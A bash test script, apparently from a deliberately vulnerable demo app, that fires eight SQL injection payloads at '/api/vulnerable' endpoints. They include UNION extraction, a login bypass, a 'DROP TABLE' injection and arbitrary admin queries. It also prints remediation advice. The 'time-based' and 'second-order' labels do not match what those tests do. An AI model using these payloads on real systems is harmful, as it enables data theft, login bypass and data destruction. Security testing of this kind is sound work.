#!/bin/bash

# SQL Injection Test Script
# This script tests various SQL injection vulnerabilities in the application

set -e

# Configuration
TARGET_URL="${1:-http://localhost:3000}"

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

echo -e "${RED}💉 SQL Injection Vulnerability Tests${NC}"
echo "====================================="
echo -e "Target: ${GREEN}${TARGET_URL}${NC}"
echo ""
echo -e "${YELLOW}⚠️  WARNING: This script tests for SQL injection vulnerabilities.${NC}"
echo -e "${YELLOW}    Only run this against applications you own or have permission to test.${NC}"
echo ""

# Check if target is accessible
if ! curl -s --max-time 10 "${TARGET_URL}" > /dev/null; then
    echo -e "${RED}❌ Target is not accessible. Please start the application first.${NC}"
    exit 1
fi

echo -e "${BLUE}🔍 Testing SQL Injection Vulnerabilities...${NC}"
echo ""

# Test 1: Basic SQL Injection in user ID parameter
echo -e "${BLUE}Test 1: Basic SQL Injection (User ID)${NC}"
echo "Payload: id=1' OR '1'='1"
RESPONSE=$(curl -s "${TARGET_URL}/api/vulnerable/users?id=1' OR '1'='1" || echo "ERROR")
if [[ "$RESPONSE" == *"admin"* ]] && [[ "$RESPONSE" == *"john_doe"* ]]; then
    echo -e "${RED}🚨 VULNERABLE: Basic SQL injection successful!${NC}"
    echo "Expected: Single user, Got: Multiple users"
else
    echo -e "${GREEN}✅ Protected: Basic SQL injection failed${NC}"
fi
echo ""

# Test 2: UNION-based SQL Injection
echo -e "${BLUE}Test 2: UNION-based SQL Injection${NC}"
echo "Payload: search=test' UNION SELECT 1,2,3,4,5--"
RESPONSE=$(curl -s "${TARGET_URL}/api/vulnerable/users?search=test' UNION SELECT 1,2,3,4,5--" || echo "ERROR")
if [[ "$RESPONSE" == *"\"1\""* ]] || [[ "$RESPONSE" == *"\"2\""* ]]; then
    echo -e "${RED}🚨 VULNERABLE: UNION-based SQL injection successful!${NC}"
    echo "Detected UNION query execution"
else
    echo -e "${GREEN}✅ Protected: UNION-based SQL injection failed${NC}"
fi
echo ""

# Test 3: Boolean-based SQL Injection
echo -e "${BLUE}Test 3: Boolean-based SQL Injection${NC}"
echo "Testing true condition: role=admin' OR '1'='1"
RESPONSE_TRUE=$(curl -s "${TARGET_URL}/api/vulnerable/users?role=admin' OR '1'='1" | wc -c)
echo "Testing false condition: role=admin' AND '1'='2"
RESPONSE_FALSE=$(curl -s "${TARGET_URL}/api/vulnerable/users?role=admin' AND '1'='2" | wc -c)

if [ "$RESPONSE_TRUE" -gt "$RESPONSE_FALSE" ] && [ "$RESPONSE_TRUE" -gt 50 ]; then
    echo -e "${RED}🚨 VULNERABLE: Boolean-based SQL injection detected!${NC}"
    echo "True condition returned more data than false condition"
else
    echo -e "${GREEN}✅ Protected: Boolean-based SQL injection failed${NC}"
fi
echo ""

# Test 4: Time-based SQL Injection (SQLite specific)
echo -e "${BLUE}Test 4: Time-based SQL Injection${NC}"
echo "Payload: id=1' AND (SELECT COUNT(*) FROM sqlite_master)>0--"
START_TIME=$(date +%s%N)
RESPONSE=$(curl -s "${TARGET_URL}/api/vulnerable/users?id=1' AND (SELECT COUNT(*) FROM sqlite_master)>0--" || echo "ERROR")
END_TIME=$(date +%s%N)
DURATION=$(( (END_TIME - START_TIME) / 1000000 ))

if [[ "$RESPONSE" == *"admin"* ]] || [[ "$RESPONSE" == *"id"* ]]; then
    echo -e "${RED}🚨 VULNERABLE: Time-based SQL injection successful!${NC}"
    echo "Query executed successfully (${DURATION}ms)"
else
    echo -e "${GREEN}✅ Protected: Time-based SQL injection failed${NC}"
fi
echo ""

# Test 5: Error-based SQL Injection
echo -e "${BLUE}Test 5: Error-based SQL Injection${NC}"
echo "Payload: id=1' AND (SELECT 1/0)--"
RESPONSE=$(curl -s "${TARGET_URL}/api/vulnerable/users?id=1' AND (SELECT 1/0)--" 2>&1 || echo "ERROR")
if [[ "$RESPONSE" == *"error"* ]] || [[ "$RESPONSE" == *"divide"* ]] || [[ "$RESPONSE" == *"database"* ]]; then
    echo -e "${RED}🚨 VULNERABLE: Error-based SQL injection detected!${NC}"
    echo "Database error exposed in response"
else
    echo -e "${GREEN}✅ Protected: Error-based SQL injection failed${NC}"
fi
echo ""

# Test 6: Second-order SQL Injection (Login)
echo -e "${BLUE}Test 6: Second-order SQL Injection (Login)${NC}"
echo "Payload: username=admin'--"
RESPONSE=$(curl -s -X POST "${TARGET_URL}/api/vulnerable/login" \
    -H "Content-Type: application/json" \
    -d '{"username":"admin'\''--","password":"anything"}' || echo "ERROR")
if [[ "$RESPONSE" == *"Login successful"* ]] || [[ "$RESPONSE" == *"token"* ]]; then
    echo -e "${RED}🚨 VULNERABLE: Login bypass via SQL injection!${NC}"
    echo "Authentication bypassed with SQL injection"
else
    echo -e "${GREEN}✅ Protected: Login SQL injection failed${NC}"
fi
echo ""

# Test 7: SQL Injection in Products endpoint
echo -e "${BLUE}Test 7: SQL Injection in Products (ORDER BY)${NC}"
echo "Payload: orderBy=price; DROP TABLE products--"
RESPONSE=$(curl -s "${TARGET_URL}/api/vulnerable/products?orderBy=price; DROP TABLE products--" || echo "ERROR")
if [[ "$RESPONSE" == *"error"* ]] || [[ "$RESPONSE" == *"syntax"* ]]; then
    echo -e "${RED}🚨 VULNERABLE: ORDER BY SQL injection attempt detected!${NC}"
    echo "Dangerous SQL manipulation possible"
else
    echo -e "${GREEN}✅ Protected: ORDER BY SQL injection failed${NC}"
fi
echo ""

# Test 8: Admin endpoint SQL injection
echo -e "${BLUE}Test 8: Admin SQL Injection (Direct Query)${NC}"
echo "Payload: Direct query execution"
RESPONSE=$(curl -s -X POST "${TARGET_URL}/api/vulnerable/admin" \
    -H "Content-Type: application/json" \
    -d '{"action":"execute","query":"SELECT * FROM users WHERE role='\''admin'\''"}' || echo "ERROR")
if [[ "$RESPONSE" == *"admin"* ]] && [[ "$RESPONSE" == *"result"* ]]; then
    echo -e "${RED}🚨 CRITICAL: Direct SQL query execution enabled!${NC}"
    echo "Admin endpoint allows arbitrary SQL execution"
else
    echo -e "${GREEN}✅ Protected: Direct SQL execution blocked${NC}"
fi
echo ""

# Summary
echo "======================================"
echo -e "${BLUE}📋 Test Summary${NC}"
echo "======================================"
echo "Tested 8 different SQL injection attack vectors:"
echo "  1. Basic SQL injection (WHERE clause)"
echo "  2. UNION-based data extraction"
echo "  3. Boolean-based blind injection"
echo "  4. Time-based blind injection"
echo "  5. Error-based information disclosure"
echo "  6. Authentication bypass"
echo "  7. ORDER BY clause injection"
echo "  8. Direct query execution"
echo ""
echo -e "${YELLOW}💡 Recommendations:${NC}"
echo "  • Use parameterized queries/prepared statements"
echo "  • Implement input validation and sanitization"
echo "  • Apply principle of least privilege to database users"
echo "  • Enable SQL query logging and monitoring"
echo "  • Run OWASP ZAP scans: ./scripts/zap-full-scan.sh"
echo ""